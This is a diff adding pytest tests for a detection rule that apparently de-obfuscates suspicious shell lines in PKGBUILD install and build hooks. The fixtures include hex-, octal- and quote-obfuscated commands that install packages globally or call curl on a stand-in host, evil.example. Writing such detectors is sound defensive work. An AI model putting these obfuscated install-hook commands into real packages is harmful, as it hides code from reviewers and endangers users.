@@ -456,3 +456,74 @@ def test_scan_diff_reports_reduced_coverage_without_tree():
     fact = scan_diff(diff, config={})
     assert not fact.tree_analyzed
     assert "R118" not in {e.rule_id for e in fact.score_breakdown}
+
+
+# --- R117: the reconstruction itself is a reported fact ---
+
+
+@pytest.mark.parametrize("obfuscated,revealed", [
+    (r"$'\x62\x75\x6e' install -g evil", "bun"),
+    (r"$'\142\165\156' install -g evil", "bun"),
+    ("b''u''n install -g evil", "bun"),
+    (r"$(printf '\x63\x75\x72\x6c') https://evil.example/x", "curl"),
+])
+def test_r117_reports_what_the_line_was_read_as(obfuscated, revealed):
+    diff = f"""--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -1,3 +1,5 @@
+ pkgname=x
++post_install() {{
++  {obfuscated}
++}}
+"""
+    findings = [f for f in structural(diff) if f["rule_id"] == "R117"]
+    assert findings, obfuscated
+    assert findings[0]["severity"] == "INFO"
+    assert findings[0]["params"]["revealed"] == revealed
+    assert findings[0]["params"]["reconstructed"] is True
+
+
+def test_r117_reconstruction_reaches_the_rule_that_matches_on_it():
+    """R081 matches the reconstructed text; R117 is what tells the reader
+    the file does not literally contain the word R081 quoted."""
+    diff = """--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -1,3 +1,5 @@
+ pkgname=x
++post_install() {
++  $'\\x62\\x75\\x6e' install -g nextfile-js
++}
+"""
+    assert {"R081", "R117"} <= rule_ids(structural(diff))
+
+
+def test_r117_reports_an_unreconstructable_literal_as_inconclusive():
+    diff = """--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -1,3 +1,4 @@
+ pkgname=x
++build() {
++  eval $'\\x62\\x75\\x6e
++}
+"""
+    findings = [f for f in structural(diff) if f["rule_id"] == "R117"]
+    assert findings
+    assert findings[0]["params"]["reconstructed"] is False
+
+
+@pytest.mark.parametrize("line", [
+    r"sed $'s/\t/ /' input",
+    r"printf '%s\n' \"$pkgver\"",
+    "grep '/Windows/Fonts/.*[cf]$' list",
+    "install -Dm755 app \"$pkgdir/usr/bin/app\"",
+])
+def test_r117_quiet_on_ordinary_shell(line):
+    diff = f"""--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -1,3 +1,4 @@
+ pkgname=x
++build() {{
++  {line}
++}}
+"""
+    assert "R117" not in rule_ids(structural(diff))
